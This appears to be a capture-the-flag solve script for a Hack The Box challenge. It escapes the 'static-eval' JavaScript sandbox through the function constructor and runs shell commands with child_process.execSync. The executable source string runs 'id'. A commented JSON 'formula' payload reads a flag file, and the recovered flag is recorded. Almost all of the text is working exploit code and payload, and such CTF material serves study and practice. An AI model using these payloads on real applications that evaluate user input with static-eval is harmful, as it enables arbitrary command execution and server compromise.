const evaluate = require('static-eval');
const parse = require('esprima').parse;

//var src ='(function({x}){return x.constructor})({x:"".sub})("console.log(process.env)")()'
var src = '(function({x}){return x.constructor})({x:"".sub})("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()'
let ast = parse(src).body[0].expression
let weight = evaluate(ast, {})
console.log(ast)
console.log(weight)

/*
 * Payload:
 * {"name":"Kenny Bakr",
 *  "formula":"(function(x){return `${eval(\"throw new TypeError(global.process.mainModule.constructor._load('child_process').execSync('cat flagKntmG').toString())\")}`})()"
 * }
 */

// Flag: HTB{f33l1ng_4_l1ttl3_blu3_0r_m4yb3_p1nk?...you_n33d_to_b3h4v&#39;eval!!}
